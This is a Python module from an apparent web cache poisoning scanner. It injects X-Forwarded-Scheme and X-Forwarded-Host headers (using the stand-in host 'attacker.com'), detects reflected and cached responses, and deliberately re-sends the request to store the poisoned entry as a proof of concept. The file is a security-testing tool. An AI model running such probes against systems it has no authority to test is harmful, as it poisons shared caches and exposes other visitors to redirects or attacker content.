from core.cache import extract_cache_headers
import core.config

class CommonHeadersAttack:
    name = "Common Headers"

    def run(self, ctx):
        ctx.log.debug(f"Testing for {self.name}")

        headers = ctx.headers.copy()

        # x-forwarded-scheme
        headers["x-forwarded-scheme"] = "http"
        resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

        if ctx.is_different(resp):
            if extract_cache_headers(resp):
                # Send the same request one more time to save the cache
                resp, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)

                ctx.log.vuln(f"x-forwarded-scheme → possible redirect loop | Exploit PoC {ctx.url}?{cb}")
                return

        # x-forwarded-host
        headers = ctx.headers.copy()
        headers["X-Forwarded-Scheme"] = "https"
        headers["X-Forwarded-Host"] = "attacker.com"

        resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

        if resp and (
            "attacker.com" in resp.text
            or any("attacker.com" in v for v in resp.headers.values())
        ):
            if extract_cache_headers(resp):
                # Send the same request one more time to save the cache
                resp, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)

                ctx.log.vuln(f"X-Forwarded-Host injection | Exploit PoC: {ctx.url}?{cb}")

                if core.config.open_browser:
                    import webbrowser
                    webbrowser.open_new_tab(f"{ctx.url}?{cb}")
                return

        ctx.log.error("Not vulnerable")